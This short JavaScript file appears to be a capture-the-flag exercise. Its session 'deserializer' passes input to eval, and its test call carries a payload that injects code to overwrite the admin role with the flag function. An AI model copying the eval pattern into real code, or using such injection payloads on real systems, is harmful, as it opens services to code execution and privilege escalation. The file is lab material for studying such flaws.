const fs = require("fs");
const { getFlag } = require("./flag");

function deserializeSession(serializedData) {
  return eval(`(${serializedData})`);
}

const userDatabase = {
  admin: { username: 'admin', role: 'admin'},  
  user: { username: 'user', role: 'user' },
};

function test(sessionData) {
  const session = deserializeSession(sessionData);
  console.log({ deserialized: session })
  if (session && userDatabase[session.username]) {
    const user = userDatabase[session.username];
    //res.send(`Welcome ${user.username}! Your role is: ${user.role}`);
    console.log(`Welcome ${user.username}! Your role is: ${user.role}`);
  } else {
    console.log(false);
  }
}

test(`(() => {userDatabase.admin.role = getFlag;return { username: 'admin' }})()`)
